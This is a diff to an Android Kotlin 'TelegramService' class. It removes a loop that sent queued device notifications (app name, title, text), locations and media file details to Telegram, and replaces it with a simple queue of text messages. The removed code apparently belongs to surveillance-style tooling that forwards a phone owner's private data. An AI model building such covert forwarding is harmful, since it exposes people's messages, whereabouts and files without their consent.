@@ -56,47 +56,12 @@ class TelegramService {
         if (!isOnline()) return
         
         database?.let { db ->
-            // Process pending notifications
-            val unsentNotifications = db.notificationDao().getUnsentNotifications()
-            unsentNotifications.forEach { notification ->
-                val success = sendNotificationAlert(
-                    notification.appName,
-                    notification.title,
-                    notification.text,
-                    notification.timestamp
-                )
+            // Process pending telegram messages
+            val unsentMessages = db.telegramMessageDao().getUnsentMessages()
+            unsentMessages.forEach { message ->
+                val success = sendMessage(message.text)
                 if (success) {
-                    db.notificationDao().markAsSent(notification.id)
-                }
-            }
-            
-            // Process pending locations
-            val unsentLocations = db.locationDao().getUnsentLocations()
-            unsentLocations.forEach { location ->
-                val success = sendLocationUpdate(
-                    location.latitude,
-                    location.longitude,
-                    location.accuracy,
-                    location.address,
-                    location.timestamp
-                )
-                if (success) {
-                    db.locationDao().markAsSent(location.id)
-                }
-            }
-            
-            // Process pending media files
-            val unsentMediaFiles = db.mediaFileDao().getUnsentMediaFiles()
-            unsentMediaFiles.forEach { mediaFile ->
-                val success = sendMediaFileAlert(
-                    mediaFile.fileName,
-                    mediaFile.filePath,
-                    mediaFile.fileType,
-                    mediaFile.fileSize,
-                    mediaFile.dateAdded
-                )
-                if (success) {
-                    db.mediaFileDao().markAsSent(mediaFile.id)
+                    db.telegramMessageDao().markAsSent(message.id)
                 }
             }
         }
